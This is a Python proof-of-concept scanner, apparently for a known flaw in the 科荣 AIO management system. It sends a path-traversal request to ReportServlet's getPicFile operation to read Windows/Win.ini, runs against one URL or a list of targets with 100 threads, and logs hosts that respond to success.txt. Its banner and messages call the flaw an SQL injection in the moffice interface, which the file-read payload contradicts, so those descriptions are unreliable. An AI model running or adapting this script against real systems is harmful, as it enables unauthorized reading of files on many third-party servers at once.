import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    banner = """
           <<<<<科荣 AIO 管理系统 moffice接口处存在SQL注入漏洞>>>>>   
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='科荣 AIO 管理系统 moffice接口处存在SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini"
    url = target+payload
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    }
    try:
        re = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if re.status_code == 200 and 'support' in re.text:
            print( f"[+] {target} moffice接口处存在SQL注入漏洞！")
            with open('success.txt',mode='a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f'该{target}不存在SQL注入漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}")


if __name__ == '__main__':
    main()